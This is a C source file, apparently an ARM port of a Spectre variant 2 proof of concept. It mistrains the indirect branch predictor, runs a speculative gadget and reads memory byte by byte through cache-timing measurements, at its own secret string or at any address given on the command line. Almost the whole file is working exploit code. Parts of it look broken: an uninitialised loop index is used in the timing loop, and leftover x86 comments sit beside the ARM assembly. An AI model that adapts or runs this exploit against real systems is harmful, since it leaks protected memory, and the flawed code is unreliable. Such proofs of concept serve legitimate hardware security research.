/*
 * Spectre Variant 2 Proof of Concept.
 *
 * The program uses spectre v2 to read its own memory.
 * See the paper for details: https://spectreattack.com/spectre.pdf.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pthread.h>
#include <time.h>

#define CACHE_HIT_THRESHOLD (50)
#define GAP (512)

volatile uint64_t countertime = 0;
uint64_t miss_min = 0;
uint8_t channel[256 * GAP]; // side channel to extract secret phrase
uint64_t *target; // pointer to indirect call target
char *secret = "The Magic Words";

clock_t start, end;

void *inc_countertime(void *a) {
	while (1) {
		countertime++;
		asm volatile ("DMB SY");
	}
}

static uint64_t timed_read(volatile uint8_t *addr) {
	uint64_t ns = countertime;

	asm volatile (
		"DSB SY\n"
		"LDR X5, [%[ad]]\n"
		"DSB SY\n"
		: : [ad] "r" (addr) : "x5");

	return countertime - ns;
}

static inline void flush(void *addr) {
        asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
        asm volatile("DSB SY");
}


uint64_t measure_latency() {
	uint64_t ns;
	uint64_t min = 0xFFFFF;

	for (int r = 0; r < 300; r++) {
		flush(&channel[0]);
		ns = timed_read(&channel[0]);
		if (ns < min) min = ns;
	}

	return min;
}

// mistrained target of indirect call
int gadget(char *addr)
{
  //printf("gadget\n");
  return channel[*addr * GAP]; // speculative loads fetch data into the cache
}

// safe target of indirect call
int safe_target()
{
  //printf("safe_target\n");
  return 42;
}

// function that makes indirect call
// note that addr will be passed to gadget via %rdi
int victim(char *addr, int input)
{
  int junk = 0;
  // set up branch history buffer (bhb) by performing >29 taken branches
  // see https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
  //   for details about how the branch prediction mechanism works
  // junk and input used to guarantee the loop is actually run
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  int result;
  
  /*
  // call *target
  __asm volatile("callq *%1\n"		// %0=output %1=input
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  */
  //printf("Before call --------------------\n");
  // call *target
  __asm volatile("BLR %1\n"		// %1 = *target
  		  "MOV %0, x0\n"
                 : "=r" (result)	// output operands
                 : "r" (*target)	// input operands
                 : "x0", "x1", "x2", "x3", "x30");		// list of clobbered registers
  //printf("After call\n");
  return result & junk;
}

// see appendix C of https://spectreattack.com/spectre.pdf
void readByte(char *addr_to_read, char result[2], int score[2])
{
  int hits[256]; // record number of cache hits
  int tries, i, j, k, mix_i, junk = 0;
  //uint64_t elapsed;
  uint8_t *addr;
  char dummyChar = '$';
  register uint64_t time2;
  


  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = 999; tries > 0; tries--) {
    // poison branch target predictor
    *target = (uint64_t)&gadget;
    asm volatile("DSB SY");

    for (j = 50; j > 0; j--) {				
      junk ^= victim(&dummyChar, 0);
    }
    asm volatile("DSB SY");

    // flush side channel
    for (i = 0; i < 256; i++)
      flush(&channel[i * GAP]);
    asm volatile("DSB SY");

    // change to safe target
    *target = (uint64_t)&safe_target;
    asm volatile("DSB SY");

    // flush target to prolong misprediction interval
    flush((void*) target);
    asm volatile("DSB SY");

    // call victim
    junk ^= victim(addr_to_read, 0);
    asm volatile("DSB SY");

    // now, the value of *addr_to_read should be cached even though
    // the logical execution path never calls gadget()

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      //mix_i = ((i * 167) + 13) & 255;
      printf("mix_i: %d\n", mix_i);
      time2 = timed_read(&channel[mix_i * GAP]);
      //addr = &channel[mix_i * GAP];
      //int startt = countertime;
      //junk ^= *addr;
      asm volatile("DSB SY"); // make sure read completes before we check the timer
      //elapsed = countertime - startt;
      if (time2 <= miss_min ) {
        hits[mix_i]++;
	}
    }

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || hits[i] >= hits[j]) {
        k = j;
        j = i;
      } else if (k < 0 || hits[i] >= hits[k]) {
        k = i;
      }
    }
    if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
      break;
    }
    //printf("index = %d / score = %d / mix_i = %d\n", j, hits[j], mix_i);
  }

  //printf("Used %lld instructions\n", count);
  //printf("time2: %ld\n", time2);
  //hits[0] ^= junk; // prevent junk from being optimized out
  result[0] = (char)j;
  score[0] = hits[j];
  //printf("hits = %d / score = %d / mix_i = %d\n", hits[j], score[0]);
  result[1] = (char)k;
  score[1] = hits[k];
}

int main(int argc, char *argv[])
{
	
	unsigned long masks[2] = {0x0f, 0xf0};
	unsigned long mask = 0xf0;
	
	printf("cpu mask(LITTLE = 0x0f, big = 0xf0) = %#lx \n", mask);
	if (sched_setaffinity(0, sizeof(mask), (cpu_set_t*)&mask) <0) {//cpu pinning -> A73  
		perror("sched_setaffinity");  
	}  

	printf("Run the Spectre Code using A73(big)\n");
	printf("Putting '%s' in memory\n", secret);	

	target = (uint64_t*)malloc(sizeof(uint64_t));

	char result[2];
	int score[2];
	int len = strlen(secret);
	char *addr = secret;

	if (argc == 3) {
		sscanf(argv[1], "%p", (void **)(&addr));
		sscanf(argv[2], "%d", &len);
	}
  
	for (size_t i = 0; i < sizeof(channel); i++)
		channel[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */  
  
	pthread_t inc_countertime_thread;
	if (pthread_create(&inc_countertime_thread, NULL, inc_countertime, NULL)) {
		fprintf(stderr, "Error creating thread\n");
		return 1;
	}
	
	while (countertime < 10000000);
	asm volatile ("DSB SY");

	miss_min = measure_latency();
	if (miss_min == 0) {
		fprintf(stderr, "Unreliable access timing\n");
		exit(EXIT_FAILURE);
	}
	miss_min -= 1;
	printf("miss_min %d\n", miss_min);
	

	printf("Reading %d bytes starting at %p:\n", len, addr);
	while (--len >= 0) {
	    printf("reading %p...", addr);
	    readByte(addr++, result, score);			
	    printf("%s: ", (score[0] >= 2 * score[1] ? "success" : "unclear"));
	    printf("0x%02X='%c' score=%d\n", result[0], (result[0] > 31 && result[0] < 127 ? result[0] : '?'), score[0]);
	  }
	  printf("\n");

	free(target);	  

	return 0;
}
